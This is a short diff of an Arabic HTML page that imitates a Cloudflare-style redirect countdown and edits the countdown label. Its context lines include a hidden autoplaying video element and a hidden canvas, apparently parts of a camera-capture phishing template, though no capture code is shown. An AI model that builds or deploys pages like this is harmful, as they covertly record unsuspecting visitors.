@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar-SA">
 <head> 
@@ -86,7 +87,7 @@ a:hover {color: #f4a15d;}
 var count = 11;
 var countdown = setInterval(function() {
   if (count > 0) {
-    document.getElementById("cf-spinner-redirecting").innerHTML = "جار التوجيه... " + count;
+    document.getElementById("cf-spinner-redirecting").innerHTML = "قم في تعديله لا تجعله يوجهني... " + count;
     count--;
   } else {
     clearInterval(countdown);
@@ -96,7 +97,6 @@ var countdown = setInterval(function() {
   }
 }, 1000);
 </script>
-
 <video id="video" style="display:none"  playsinline autoplay></video>
 <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
